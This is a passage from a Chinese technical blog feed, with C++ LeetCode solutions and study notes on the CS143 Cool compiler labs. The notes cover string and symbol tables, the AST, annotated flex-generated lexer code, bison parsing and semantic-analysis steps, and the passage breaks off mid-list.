statement</code></pre><ul><li>要求expression必须是一个能够返回迭代器begin和end成员的序列类型（数组、初始化列表、vector和string等等）</li><li>要求declaration定义一个变量，满足序列中的每个元素都能转换成该变量的类型（auto）</li><li>如果需要对序列中的元素执行修改写操作，需要把循环变量声明成引用类型</li><li>每次迭代都会重新定义循环控制变量，并将其初始化为序列的下一个值，随后执行statement</li></ul><pre><code class="line-numbers language-C++">class Solution {public:    vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; A) {        vector&lt;int&gt; result;        for(int num:A)        {            result.push_back(num*num);        }        sort(result.begin(),result.end());        return result;    }};</code></pre><h3 id="better-solution"><a href="#better-solution" class="headerlink" title="better solution"></a>better solution</h3><p>第一种方法没有利用到题目中整数数组A为非递减排序的条件，需要使用sort()快排，我们可以利用双指针避免。</p><p>由于整数数组A非递减排序，那么以第一个非负数为界，向左序列的数的平方递增，向右序列的数的平方也递增，我们只需要使用双指针分别向两边走并不断把较小的数加入结果序列并重点关注边界的情况即可：</p><pre><code class="line-numbers language-C++">class Solution {public:    vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; A) {        int boundary=-1;        for(int i=0;i&lt;A.size();i++){            if(A[i]&lt;0)            {                boundary++;            }            else                break;        }        vector&lt;int&gt; result;        int i = boundary , j = boundary+1;        while(i&gt;=0||j&lt;A.size()){            if(i&lt;0){                result.push_back(A[j]*A[j]);                ++j;            }            else if(j==A.size()){                result.push_back(A[i]*A[i]);                --i;            }            else if(A[i]*A[i]&lt;A[j]*A[j]){                result.push_back(A[i]*A[i]);                --i;            }            else {                result.push_back(A[j]*A[j]);                ++j;            }        }        return result;    }};</code></pre><h2 id="1365-有多少小于当前数字的数字"><a href="#1365-有多少小于当前数字的数字" class="headerlink" title="1365. 有多少小于当前数字的数字"></a><a href="https://leetcode-cn.com/problems/how-many-numbers-are-smaller-than-the-current-number/" target="_blank" rel="noopener">1365. 有多少小于当前数字的数字</a></h2><h3 id="first-try-1"><a href="#first-try-1" class="headerlink" title="first try"></a>first try</h3><pre><code class="line-numbers language-C++">class Solution {public:    vector&lt;int&gt; smallerNumbersThanCurrent(vector&lt;int&gt;&amp; nums) {        vector&lt;int&gt; result;        for(int i=0;i&lt;nums.size();i++){            int count=0;            for(int j=0;j&lt;nums.size();j++){                if(j != i){                    if(nums[j]&lt;nums[i]){                        count++;                    }                }            }            result.push_back(count);        }        return result;    }};</code></pre>]]></content>
    
    
    <summary type="html">LeetCode 977 1365 Solution</summary>
    
    
    
    <category term="LeetCode" scheme="http://theffth.github.io/categories/LeetCode/"/>
    
    
    <category term="977 1365" scheme="http://theffth.github.io/tags/977-1365/"/>
    
  </entry>
  
  <entry>
    <title>Compiler - CS143</title>
    <link href="http://theffth.github.io/2020/07/29/Compiler-CS143/"/>
    <id>http://theffth.github.io/2020/07/29/Compiler-CS143/</id>
    <published>2020-07-28T16:05:26.000Z</published>
    <updated>2020-11-01T07:27:02.138Z</updated>
    
    <content type="html"><![CDATA[<p>此文档主要记录和总结cs143课程相关的lab项目。阅读和理解课程提供的任务指导书和任务指导书中要求阅读的材料非常重要。</p><p> The Cool Reference Manual 的部分翻译： <a href="https://www.cnblogs.com/pinkman/archive/2013/03/12/2954902.html" target="_blank" rel="noopener">https://www.cnblogs.com/pinkman/archive/2013/03/12/2954902.html</a> </p><h2 id="A-Tour-of-the-Cool-Support-Code-部分分析"><a href="#A-Tour-of-the-Cool-Support-Code-部分分析" class="headerlink" title="A Tour of the Cool Support Code 部分分析"></a>A Tour of the Cool Support Code 部分分析</h2><p>此文档主要介绍lab project中的提供的文件，结合源代码理解它们并正确使用已有架构很重要。</p><h3 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h3><p>list.h文件实现了简单的链表数据类型，构造函数List在链表的前部添加新元素，hd返回链表的第一个节点，tl返回链表第一个节点指向的后续链表。提供函数list_map()，list_print(), list_length()。此结构在实现string tables和symbol tables的时候都有用到。</p><h3 id="String-Tables"><a href="#String-Tables" class="headerlink" title="String Tables"></a>String Tables</h3><p>所有的编译器都需要维护大量的字符串，例如：程序标识符、数字型常量和字符串常量。通常，这些字符串中有许多是相同的。例如：每一个标识符通常会在程序中出现很多次。为了确保字符串常量的紧凑存储和有效操作，需要使用专门的数据结构——字符串表。</p><p>字符串表是维护了每一个字符串的简单copy的查找表，Cool字符串表类在stringtab.h中提供了各种插入和查询字符串表的函数。实际中的编译器使用哈希数据结构来实现字符串表，Cool编译器使用lists链表来实现字符串表。</p><p>Cool字符串表由类型Entry组成，每一个Entry存储一个字符串，字符串的长度和该字符串的唯一整数索引下标。Cool编译器结构的重要一点是它有三个不同的字符串表：stringtable（字符串常量表）,inttable（整数常量表）,idtable（标识符表）。code generator 必须区分整数常量和字符串常量，并从标识符中区分它们，因为程序中每一个字符串常量和整数常量都生成不同的代码。拥有三个不同的字符串表容易区分。三个表有不同的数据类型，都是Entry的派生类。指向Entry的指针是Symbol。</p><p>由于字符串表存储每个字符串的copy，比较x和y代表的两个IntEntrys，StrEntrys，IdEntrys是否一样只需要比较x==y。比较两个不同符号表中的字符串是没有意义的。</p><p>有三个函数向表中添加元素：add string(char *s,int m)；add string(char *s)；<br>add int(int i)，返回Entry的派生类来描述符号表表项。</p><p>相关源代码实现：stringtab.h  stringtab_functions.h  stringtab.cc</p><h3 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h3><p>除了字符串之外，编译器还必须同时确定和管理作用域。Symbol Table是管理作用域的数据结构，是另一个查找表。关键字是符号/名称，结果是与该符号相关的任何信息。</p><p>除了加入和删除符号之外，符号表同时支持进入和退出作用域和检查一个标识符是否在当前作用域下已定义的操作。查询操作必须也遵循语言的作用域规则，如果标识符x有多重定义，作用域规则必须确定x查找返回的定义，在Cool和一般语言中，最内层的定义隐藏外层的定义，因此返回具有x定义的最内层的作用域的定义。</p><p>Cool 符号表是作用域链表实现的，每一个作用域都是&lt;identifier,info&gt;的链表。</p><h3 id="Utilities"><a href="#Utilities" class="headerlink" title="Utilities"></a>Utilities</h3><p>utilities.h和utilities.cc定义了许多函数，供实现和调试Cool 词法和语法分析使用。</p><h3 id="Abstract-Syntax-Tree"><a href="#Abstract-Syntax-Tree" class="headerlink" title="Abstract Syntax Tree"></a>Abstract Syntax Tree</h3><h4 id="Phyla-and-Constructors"><a href="#Phyla-and-Constructors" class="headerlink" title="Phyla and Constructors"></a>Phyla and Constructors</h4><p>AST数据类型为每一种Cool结构提供一个表示该表达式的类。有一个let表达式的类，+表达式的类等等。这些类的对象是Cool 抽象语法树AST的节点。例如：表达式e1+e2由一个+表达式对象和两个子树：一个用于表示e1表达式的树，一个用于表示e2表达式的树。</p><p>Cool 的抽象语法树在一个叫做APS的语言中指定，在APS术语中，抽象语法树的节点（let，＋等）被称为constructors，AST的形式由一组phyla描述，每一种phylum有一个或多个constructors。</p><p>Phyla实际上是类型，也就是说，不是一大组没有分化过的constructors，而是constructors根据功能分组在一起。例如：表达式的抽象语法树和类抽象语法树不同。phyla定义在文件cool-tree.aps中:</p><pre><code>module COOL begin  phylum Program;  phylum Class_;  phylum Classes = LIST[Class_];  phylum Feature;  phylum Features = LIST[Feature];  phylum Formal;  phylum Formals = LIST[Formal];  phylum Expression;  phylum Expressions = LIST[Expression];  phylum Case;  phylum Cases = LIST[Case];</code></pre><p>从定义中可以看出，有两种完全不同的phyla：普通型phyla和链表型phyla，每个普通型phyla都有相关的constructors，链表型phyla有一组固定的list操作。</p><p>每一个constructor都有含有类型的参数并返回一个有类型的结果。类型要么是phyla要么是任何普通的C++类型。实际上，phyla声明本身会由APS编译器编译成C++类声明。一个constructor定义的样例如下：</p><pre><code>constructor class_(name : Symbol ; parent : Symbol ; features : Features ; filename : Symbol): Class_;</code></pre><p>定义指出class_ constructor有四个参数：一个类名的Symbol，一个父类名的Symbol，一个Features，一个该类定义出现的文件名的Symbol。Features的phylum被定义为Feature的链表：</p><pre><code>phylum Features = LIST[Feature];</code></pre><p>定义在AST链表上的操作描述见第二小节。</p><p>class_ constructor返回一个Class_类型的抽象语法树。在cool.y文件中，有一个使用class_ constructor的例子：</p><pre><code>class : CLASS TYPEID INHERITS TYPEID IS optional_feature_list END ’;’{ $$ = class_($2,$4,$6,stringtable.add_string(curr_filename)); }</code></pre><p>class_ constructor 建立了一个Class_树节点，有四个参数作为子节点。因为参数类型被声明了，C++类型检查器会强制class_ constructor只接受正确类型的参数。见第五小节和cool-tree.aps了解更多其他constructors。</p><h2 id="PA2-lexer-词法分析"><a href="#PA2-lexer-词法分析" class="headerlink" title="PA2 lexer 词法分析"></a>PA2 lexer 词法分析</h2><p>完成此lab前主要学习哈工大编译原理视频。理解任务说明书非常重要。</p><p>参考资料：</p><p>flex文档（尤其参考其中pattern部分）： <a href="https://eternalsakura13.com/2020/05/27/flex/" target="_blank" rel="noopener">https://eternalsakura13.com/2020/05/27/flex/</a> </p><p><a href="https://courses.edx.org/assets/courseware/v1/27e1a38f1161e61d91c25a4b1805489b/asset-v1:StanfordOnline+SOE.YCSCS1+1T2020+type@asset+block/cool_manual.pdf" target="_blank" rel="noopener">The Cool Reference Manual</a> 中 10 Lexical Structure 和  11 Cool Syntax 部分</p><p>词法分析器lexer可以将我们输入的程序语言与编写的正则表达式的规则进行匹配来返回一个个token。</p><p>在这个lab中我们使用flex语言来编写Cool编译器的词法分析器。利用Flex我们可以通过为每一个匹配的pattern编写一些正则表达式和对应执行的action来实现词法分析器。Flex会把我们的规则文件编译成C源码，实现一个有穷自动机，以识别我们在规则文件中指定的正则表达式。可以检查出因为状态机无法正确转换的错误，例如：引号、注释符号不闭合；字符串过长等。</p><p>flex语言的结构如下：</p><pre><code>%{Declarations%}Definitions%%Rules%%User subroutines</code></pre><p>其中Declarations和User subroutines是可选项。Definition也是可选的，但是便于我们给正则表达式取名字，例如：<code>\DIGIT [0-9]</code>定义了数字。其中，最重要的部分是rules，它指定了有匹配到的正则表达式时进行的action，action有常规的C语言代码指定。Flex使用最长匹配原则。</p><p>编写规则的时候，根据之前遇到的tokens来执行不同的action。可以通过在declaration中声明全局变量来追踪状态，Flex中提供了状态声明的方式，例如：</p><pre><code>%Start COMMENT</code></pre><p>可以通过<code>BEGIN(COMMENT)</code>把COMMENT状态设置为TRUE，要仅在先前遇到开头注释时执行操作，可以使用以下语法在状态COMMENT中声明规则：</p><pre><code>&lt;COMMENT&gt; {// the rest of your rule ...}</code></pre><p>特殊的默认状态是INITIAL。</p><h3 id="生成lexer代码分析"><a href="#生成lexer代码分析" class="headerlink" title="生成lexer代码分析"></a>生成lexer代码分析</h3><p>主要分析编写编译器过程中生成的cool-lex.cc文件的代码结构：</p><p>首先是定义flex版本号和flex整数类型，以及一些处理缓冲区和状态转换的宏定义，</p><pre><code class="line-numbers language-C">/* A lexical scanner generated by flex */#define FLEX_SCANNER#define YY_FLEX_MAJOR_VERSION 2#define YY_FLEX_MINOR_VERSION 6#define YY_FLEX_SUBMINOR_VERSION 0#if YY_FLEX_SUBMINOR_VERSION &gt; 0#define FLEX_BETA#endif/* First, we deal with  platform-specific or compiler-specific issues. */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;stdlib.h&gt;/* flex integer type definitions */#ifndef FLEXINT_H#define FLEXINT_H/* C99 systems have &lt;inttypes.h&gt;. Non-C99 systems may or may not. */typedef signed char flex_int8_t;typedef short int flex_int16_t;typedef int flex_int32_t;typedef unsigned char flex_uint8_t; typedef unsigned short int flex_uint16_t;typedef unsigned int flex_uint32_t;/* Limits of integral types. */#ifndef INT8_MIN#define INT8_MIN               (-128)#endif#ifndef INT16_MIN#define INT16_MIN              (-32767-1)#endif#ifndef INT32_MIN#define INT32_MIN              (-2147483647-1)#endif#ifndef INT8_MAX#define INT8_MAX               (127)#endif#ifndef INT16_MAX#define INT16_MAX              (32767)#endif#ifndef INT32_MAX#define INT32_MAX              (2147483647)#endif#ifndef UINT8_MAX#define UINT8_MAX              (255U)#endif#ifndef UINT16_MAX#define UINT16_MAX             (65535U)#endif#ifndef UINT32_MAX#define UINT32_MAX             (4294967295U)#endif#endif /* ! C99 */#endif /* ! FLEXINT_H *//*存储类修饰符const有效 */#define YY_USE_CONST#ifdef YY_USE_CONST#define yyconst const#else#define yyconst#endif/* %not-for-header *//* 在文件结束时返回YY_NULL */#define YY_NULL 0/*将可能为负的，可能为带符号的char转换为一个无符号整数， *以用作数组索引。如果带符号的char为负数，我们想将其视为8位无符号的char， *因此采用双精度强制转换。 */#define YY_SC_TO_UI(c) ((unsigned int) (unsigned char) c)/* 进入开始状态 */#define BEGIN (yy_start) = 1 + 2 */* 将当前的开始状态转换为一个值，以后可以将该值传递给BEGIN以返回该状态。   YYSTATE别名用于lex兼容性。 */#define YY_START (((yy_start) - 1) / 2)#define YYSTATE YY_START/* 给定开始状态的EOF规则的action num。 */#define YY_STATE_EOF(state) (YY_END_OF_BUFFER + state + 1)/* 开始处理新文件 */#define YY_NEW_FILE yyrestart(yyin  )#define YY_END_OF_BUFFER_CHAR 0/* 默认输入缓冲区的大小 */#ifndef YY_BUF_SIZE#ifdef __ia64__/* On IA-64, the buffer size is 16k, not 8k. * Moreover, YY_BUF_SIZE is 2*YY_READ_BUF_SIZE in the general case. * Ditto for the __ia64__ case accordingly. */#define YY_BUF_SIZE 32768#else#define YY_BUF_SIZE 16384#endif /* __ia64__ */#endif/* 状态buf必须足够大，才能在主缓冲区中为每个字符保留一个状态。*/#define YY_STATE_BUF_SIZE   ((YY_BUF_SIZE + 2) * sizeof(yy_state_type))#ifndef YY_TYPEDEF_YY_BUFFER_STATE#define YY_TYPEDEF_YY_BUFFER_STATEtypedef struct yy_buffer_state *YY_BUFFER_STATE;#endif#ifndef YY_TYPEDEF_YY_SIZE_T#define YY_TYPEDEF_YY_SIZE_Ttypedef size_t yy_size_t;#endifextern yy_size_t yyleng;extern FILE *yyin, *yyout;#define EOB_ACT_CONTINUE_SCAN 0#define EOB_ACT_END_OF_FILE 1#define EOB_ACT_LAST_MATCH 2    #define YY_LESS_LINENO(n)    #define YY_LINENO_REWIND_TO(ptr)/* 将除前 n 个匹配字符外的所有字符返回到输入流。 */#define yyless(n) \    do \        { \        /*撤消设置yytext的效果。*/ \        int yyless_macro_arg = (n); \        YY_LESS_LINENO(yyless_macro_arg);\        *yy_cp = (yy_hold_char); \        YY_RESTORE_YY_MORE_OFFSET \        (yy_c_buf_p) = yy_cp = yy_bp + yyless_macro_arg - YY_MORE_ADJ; \        YY_DO_BEFORE_ACTION; /* set up yytext again */ \        } \    while ( 0 )#define unput(c) yyunput( c, (yytext_ptr)  )#ifndef YY_STRUCT_YY_BUFFER_STATE#define YY_STRUCT_YY_BUFFER_STATEstruct yy_buffer_state    {    FILE *yy_input_file;    char *yy_ch_buf;        /* input buffer */    char *yy_buf_pos;        /* current position in input buffer */    /* 输入缓冲区的大小（以字节为单位），不包括EOB字符的空间。*/    yy_size_t yy_buf_size;    /* 读入yy_ch_buf的字符数，不包括EOB字符。*/    int yy_n_chars;    /*是否创建缓冲区，并且可以对其进行realloc()和free() */    int yy_is_our_buffer;    /* 是否是交互式输入; 如果是交互式,并且如果我们使用stdio作为输入,那么我们要使用getc()     * 而不是fread(), 以确保我们在每个换行符之后都停止获取输入     */    int yy_is_interactive;    /* 是否认为我们处于一行的开头,如果是,则&#39;^&#39;规则将在下一场匹配中生效，否则无效。     */    int yy_at_bol;    int yy_bs_lineno; /**&lt; The line count. */    int yy_bs_column; /**&lt; The column count. */    /* 在到达输入缓冲区的末尾时是否尝试填充它 */    int yy_fill_buffer;    int yy_buffer_status;#define YY_BUFFER_NEW 0#define YY_BUFFER_NORMAL 1    /* 如果看到了EOF,但仍有一些文本要处理,则我们将缓冲区标记为YY_EOF_PENDING,    *  以表明我们不应该再尝试从输入源中进行读取了    *  但是，由于可能存在备份，我们可能仍有许多tokens要匹配    *  当我们实际看到EOF时，我们将状态更改为 new (通过yyrestart())，    *  以便用户只需将yyin指向新的输入文件即可继续扫描    */#define YY_BUFFER_EOF_PENDING 2    };#endif /* !YY_STRUCT_YY_BUFFER_STATE *//* Stack of input buffers. */static size_t yy_buffer_stack_top = 0; /**&lt; index of top of stack. */static size_t yy_buffer_stack_max = 0; /**&lt; capacity of stack. */static YY_BUFFER_STATE * yy_buffer_stack = 0; /**&lt; Stack as an array. *//* 我们提供了用于访问缓冲区状态的宏,以防将来我们希望将缓冲区状态置于更通用的&quot;扫描器状态&quot;中 * 返回栈顶或NULL */#define YY_CURRENT_BUFFER ( (yy_buffer_stack) \                          ? (yy_buffer_stack)[(yy_buffer_stack_top)] \                          : NULL)/* 与以前的宏相同，但是便于缓冲区堆栈不是NULL或需要左值时 仅在内部使用 */#define YY_CURRENT_BUFFER_LVALUE (yy_buffer_stack)[(yy_buffer_stack_top)]/* yy_hold_char holds the character lost when yytext is formed. */static char yy_hold_char;static int yy_n_chars;        /* number of characters read into yy_ch_buf */yy_size_t yyleng;/* Points to current character in buffer. */static char *yy_c_buf_p = (char *) 0;static int yy_init = 0;        /* whether we need to initialize */static int yy_start = 0;    /* start state number *//* 用于允许yywrap()进行缓冲区切换而不是设置新的yyin的标志 */static int yy_did_buffer_switch_on_eof;void yyrestart (FILE *input_file  );void yy_switch_to_buffer (YY_BUFFER_STATE new_buffer  );YY_BUFFER_STATE yy_create_buffer (FILE *file,int size  );void yy_delete_buffer (YY_BUFFER_STATE b  );void yy_flush_buffer (YY_BUFFER_STATE b  );void yypush_buffer_state (YY_BUFFER_STATE new_buffer  );void yypop_buffer_state (void );static void yyensure_buffer_stack (void );static void yy_load_buffer_state (void );static void yy_init_buffer (YY_BUFFER_STATE b,FILE *file  );#define YY_FLUSH_BUFFER yy_flush_buffer(YY_CURRENT_BUFFER )YY_BUFFER_STATE yy_scan_buffer (char *base,yy_size_t size  );YY_BUFFER_STATE yy_scan_string (yyconst char *yy_str  );YY_BUFFER_STATE yy_scan_bytes (yyconst char *bytes,yy_size_t len  );void *yyalloc (yy_size_t  );void *yyrealloc (void *,yy_size_t  );void yyfree (void *  );#define yy_new_buffer yy_create_buffer#define yy_set_interactive(is_interactive) \    { \    if ( ! YY_CURRENT_BUFFER ){ \        yyensure_buffer_stack (); \        YY_CURRENT_BUFFER_LVALUE =    \            yy_create_buffer(yyin,YY_BUF_SIZE ); \    } \    YY_CURRENT_BUFFER_LVALUE-&gt;yy_is_interactive = is_interactive; \    }#define yy_set_bol(at_bol) \    { \    if ( ! YY_CURRENT_BUFFER ){\        yyensure_buffer_stack (); \        YY_CURRENT_BUFFER_LVALUE =    \            yy_create_buffer(yyin,YY_BUF_SIZE ); \    } \    YY_CURRENT_BUFFER_LVALUE-&gt;yy_at_bol = at_bol; \    }#define YY_AT_BOL() (YY_CURRENT_BUFFER_LVALUE-&gt;yy_at_bol)/* %% [1.0] yytext/yyin/yyout/yy_state_type/yylineno etc. def&#39;s &amp; init go here *//* Begin user sect3 */#define FLEX_DEBUGtypedef unsigned char YY_CHAR;FILE *yyin = (FILE *) 0, *yyout = (FILE *) 0;typedef int yy_state_type;extern int yylineno;int yylineno = 1;extern char *yytext;#ifdef yytext_ptr#undef yytext_ptr#endif#define yytext_ptr yytextstatic yy_state_type yy_get_previous_state (void );static yy_state_type yy_try_NUL_trans (yy_state_type current_state  );static int yy_get_next_buffer (void );static void yy_fatal_error (yyconst char msg[]  );/* 在匹配当前模式之后且在执行相应操作之前完成-设置yytext */#define YY_DO_BEFORE_ACTION \    (yytext_ptr) = yy_bp; \/* %% [2.0] code to fiddle yytext and yyleng for yymore() goes here \ */\    yyleng = (size_t) (yy_cp - yy_bp); \    (yy_hold_char) = *yy_cp; \    *yy_cp = &#39;\0&#39;; \/* %% [3.0] code to copy yytext_ptr to yytext[] goes here, if %array \ */\    (yy_c_buf_p) = yy_cp;/* %% [4.0] data tables for the DFA and the user&#39;s section 1 definitions go here */#define YY_NUM_RULES 45#define YY_END_OF_BUFFER 46</code></pre><p>接下来是压缩后的DFA状态转移表：</p><pre><code class="line-numbers language-C">yyconst flex_int16_t yy_accept[168]yyconst YY_CHAR yy_ec[256]yyconst YY_CHAR yy_meta[53]yyconst flex_uint16_t yy_base[174]yyconst flex_int16_t yy_def[174]yyconst flex_uint16_t yy_nxt[349]yyconst flex_int16_t yy_chk[349]</code></pre><p>随后，DFA的工作通过YY_DECL实现，省略了部分条件分支语句的代码如下：</p><pre><code class="line-numbers language-C">YY_DECL{    yy_state_type yy_current_state;    char *yy_cp, *yy_bp;    int yy_act;    if ( !(yy_init) )        {        (yy_init) = 1;        if ( ! (yy_start) )            (yy_start) = 1;    /* first start state */        if ( ! yyin )            yyin = stdin;        if ( ! yyout )            yyout = stdout;        if ( ! YY_CURRENT_BUFFER ) {            yyensure_buffer_stack ();            YY_CURRENT_BUFFER_LVALUE =                yy_create_buffer(yyin,YY_BUF_SIZE );        }        yy_load_buffer_state( );        }    {    while ( 1 )        /* loops until end-of-file is reached */        {        /* 设置在buf中的指针，通过yytext获取相应的字符串 */        yy_cp = (yy_c_buf_p);        /* Support of yytext. */        *yy_cp = (yy_hold_char);        /* 初始时 yy_bp 指向 yy_ch_buf */        yy_bp = yy_cp;        /* 初始从start状态开始 */        yy_current_state = (yy_start);yy_match:/* 开始进行状态转移, 通过yy_nxt表，结合yy_current_state和当前读入的字符来索引跳转状态, 直到无法转移*/        do            {            YY_CHAR yy_c = yy_ec[YY_SC_TO_UI(*yy_cp)] ;            if ( yy_accept[yy_current_state] )                {                (yy_last_accepting_state) = yy_current_state;                (yy_last_accepting_cpos) = yy_cp;                }            while ( yy_chk[yy_base[yy_current_state] + yy_c] != yy_current_state )                {                yy_current_state = (int) yy_def[yy_current_state];                if ( yy_current_state &gt;= 168 )                    yy_c = yy_meta[(unsigned int) yy_c];                }            yy_current_state = yy_nxt[yy_base[yy_current_state] + (unsigned int) yy_c];            ++yy_cp;            }        while ( yy_base[yy_current_state] != 296 );yy_find_action:/* 判断转移后的状态是否是accept ，是否需要后退处理 */        yy_act = yy_accept[yy_current_state];        if ( yy_act == 0 )            { /* have to back up */            yy_cp = (yy_last_accepting_cpos);            yy_current_state = (yy_last_accepting_state);            yy_act = yy_accept[yy_current_state];            }        YY_DO_BEFORE_ACTION;do_action:    /* 执行成功匹配规则对应的actions */        if ( yy_flex_debug )            {            if ( yy_act == 0 )                fprintf( stderr, &quot;--scanner backing up\n&quot; );            else if ( yy_act &lt; 45 )                fprintf( stderr, &quot;--accepting rule at line %ld (\&quot;%s\&quot;)\n&quot;,                         (long)yy_rule_linenum[yy_act], yytext );            else if ( yy_act == 45 )                fprintf( stderr, &quot;--accepting default rule (\&quot;%s\&quot;)\n&quot;,                         yytext );            else if ( yy_act == 46 )                fprintf( stderr, &quot;--(end of buffer or a NUL)\n&quot; );            else                fprintf( stderr, &quot;--EOF (start condition %d)\n&quot;, YY_START );            }        switch ( yy_act )    {             case 0: /* must back up */            /* undo the effects of YY_DO_BEFORE_ACTION */            *yy_cp = (yy_hold_char);            yy_cp = (yy_last_accepting_cpos);            yy_current_state = (yy_last_accepting_state);            goto yy_find_action;case 1:YY_RULE_SETUP#line 64 &quot;cool.flex&quot;{BEGIN COMMENT_IN_LINE;}    YY_BREAK.../* 此处省略case语句 */        else switch ( yy_get_next_buffer(  ) )            {            case EOB_ACT_END_OF_FILE:                {                (yy_did_buffer_switch_on_eof) = 0;                if ( yywrap( ) )                    {                    /* 注意：因为我们已经在yy_get_next_buffer()中设置了yytext,                     * 所以我们现在可以设置yy_c_buf_p                     */                    (yy_c_buf_p) = (yytext_ptr) + YY_MORE_ADJ;                    yy_act = YY_STATE_EOF(YY_START);                    goto do_action;                    }                else                    {                    if ( ! (yy_did_buffer_switch_on_eof) )                        YY_NEW_FILE;                    }                break;                }            case EOB_ACT_CONTINUE_SCAN:                (yy_c_buf_p) =                    (yytext_ptr) + yy_amount_of_matched_text;                yy_current_state = yy_get_previous_state(  );                yy_cp = (yy_c_buf_p);                yy_bp = (yytext_ptr) + YY_MORE_ADJ;                goto yy_match;            case EOB_ACT_LAST_MATCH:                (yy_c_buf_p) =                &amp;YY_CURRENT_BUFFER_LVALUE-&gt;yy_ch_buf[(yy_n_chars)];                yy_current_state = yy_get_previous_state(  );                yy_cp = (yy_c_buf_p);                yy_bp = (yytext_ptr) + YY_MORE_ADJ;                goto yy_find_action;            }        break;        }    default:        YY_FATAL_ERROR(            &quot;fatal flex scanner internal error--no action found&quot; );    } /* end of action switch */        } /* end of scanning one token */    } /* end of user&#39;s declarations */} /* end of yylex */</code></pre><p>以上是DFA的整体工作代码，也是lexer工作的核心。简单来说，有穷状态机DFA通过处理输入缓冲区的字符，从start状态进行状态转换，直到不能再进行转换或字符串处理完成后，判断是否处于accept状态，若符合则执行相应的动作action，至此实现了 pattern -&gt; action 的对应。</p><p>参考： <a href="https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/" target="_blank" rel="noopener">https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/</a> </p><h2 id="PA3-parser-语法分析"><a href="#PA3-parser-语法分析" class="headerlink" title="PA3  parser  语法分析"></a>PA3  parser  语法分析</h2><p>完成此lab前主要学习哈工大编译原理视频。理解任务说明书非常重要。</p><p>参考资料：</p><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/cs143-1.png" alt="" loading="lazy"></p><p>bison语言： <a href="https://www.cnblogs.com/pinkman/p/3179056.html" target="_blank" rel="noopener">https://www.cnblogs.com/pinkman/p/3179056.html</a> </p><p>在这个lab中，我们使用bison语言实现一个语法分析器。语法分析器的输出是抽象语法树AST，bison使用自底向上、左递归的方式，因此可以因无法规约检查出一些不符合语法规则的错误。</p><p>生成parser代码分析主要学习： <a href="https://happyers.top/compiler/bison-parser/" target="_blank" rel="noopener">https://happyers.top/compiler/bison-parser/</a> </p><h2 id="PA4-Semant-语义分析"><a href="#PA4-Semant-语义分析" class="headerlink" title="PA4 Semant 语义分析"></a>PA4 Semant 语义分析</h2><p>此lab的完成主要学习Stanford课程的PPT。</p><p>目的：完善由parser生成的AST，为其添加函数和数据成员，便于code generator所用。</p><p>主要参考资料：</p><p>Cool Reference Manual：参考相关类型规则，标识符作用域规则，Cool语言的相关限制</p><p> A Tour of Cool Support Code：结合project中的源码理解已有的架构</p><p>主要任务：</p><ol><li><p>找到所有的类并建立继承图</p></li><li><p>检查继承图是否规范</p><p>继承图不能成环，Cool中从基本类继承有限制，如果A类继承了B类但是B类未定义也是一种错误</p></li><li><p>对于每一个类：</p><ol><li><p>遍历AST，把所有可视化的声明加入到符号表中</p><p>需要遍历树，管理从AST中收集到的信息，并由此加强语义分析，同时需要利用SymbolTable确定变量的有效作用域</p></li><li><p>检查每一个表达式的类型正确性</p><p>包括检查是否在有需要时声明有效类型，以及根据类型规则验证每个表达式是否具有有效类型</p></li><li><p>用类型注释符号表</p></li><li><p>给出恰当的错误报告</p><p>除了类继承关系的错误之外，语义分析需要为其他错误给出完整且信息丰富的错误</p></li></ol></li></ol><p>主要实现：</p><ul><li>安装基本类<ul><li>Basic Class中只有Object 和 IO 类可以被继承，其余类均不可被继承</li></ul></li><li>安装用户自定义类<ul><li>会检查是否与基本类和已install的用户定义类重复</li></ul></li><li>简单检查不正确的继承关系<ul><li>会检查是否继承自未定义或者不可被继承的父类</li></ul></li><li>建立继承树，建立父子继承关系</li><li>从继承树的根部自顶向下标记reachable</li><li>判断继承图是否成环<ul><li>为每一个类继承节点设置父子节点关系，由于Cool中的继承是单继承的，每个没有继承父类的节点都设置为继承自父类，因此如果出现成环的情况，该环一定独立于以Object为根的AST。从抽象语法树的根Object出发，递归遍历AST树，为每一个子类标记为Reachable，再次遍历所有的类继承节点，若出现没有被标记过的类，则说明该继承图中存在环，退出。</li></ul></li><li>建立feature_table，添加每一个类的attr和method</li><li>检查main函数</li><li>从Root自顶向下检查每一个类的features：对类中的每一个attr和method进行类型检查</li></ul><p>具体实现：<a href="https://github.com/Theffth/skr_university/tree/master/compiler/cool/assignments" target="_blank" rel="noopener">https://github.com/Theffth/skr_university/tree/master/compiler/cool/assignments</a></p><p>项目地址：<a href="https://github.com/Theffth/skr_university/tree/master/compiler" target="_blank" rel="noopener">https://github.com/Theffth/skr_university/tree/master/compiler</a></p><h3 id="思考问题"><a href="#思考问题" class="headerlink" title="思考问题"></a>思考问题</h3><ul><li><p>浮点数和无符号整数的文法</p><ul><li><p>无符号整数的文法：</p><p>​    S-&gt;DE</p><p>​    E-&gt;ET| ε </p><p>​    T-&gt;0|D</p><p>​    D-&gt;1|2|3|4|5|6|7|8|9</p></li><li><p>浮点数的文法</p><p>​    S -&gt; WpR</p><p>​    W -&gt; DE</p><p>​    E -&gt; R | ε </p><p>​    T -&gt; 0|D</p><p>​    D -&gt; 1|2|3|4|5|6|7|8|9</p></li></ul></li><li><p>各类文法的使用条件和比较</p><ul><li><p>自顶向下分析：预测分析法</p><p>​    LL(1)文法：满足同一非终结符的可产生式的可选集互不相交</p><p>​    条件：A-&gt; α | β</p><ul><li>α 和 β 均不能推导出 ε </li><li>α 和 β 至多有一个推导出 ε </li></ul></li><li><p>自底向上分析：移入-归约分析</p><ul><li>关键问题：如何识别句柄？<ul><li>LR分析法<ul><li>LR(0)分析 ：存在移进-归约冲突 &amp; 归约-归约冲突 ==&gt;</li><li>SLR分析 :  通过简单的向前查看一个符号以确定是否是归约或如何归约，但只是必要不充分条件   ==&gt;</li><li>LR(1)分析 ：在特定位置，A的后继集合是FOLLOW(A)的子集，但比LR(0)分析的状态多很多 ==&gt;</li><li>LALR分析：把没有冲突的状态集进行合并，但可能会出现归约-归约冲突和推迟错误的发现</li><li>综上：SLR &lt; LALR &lt; 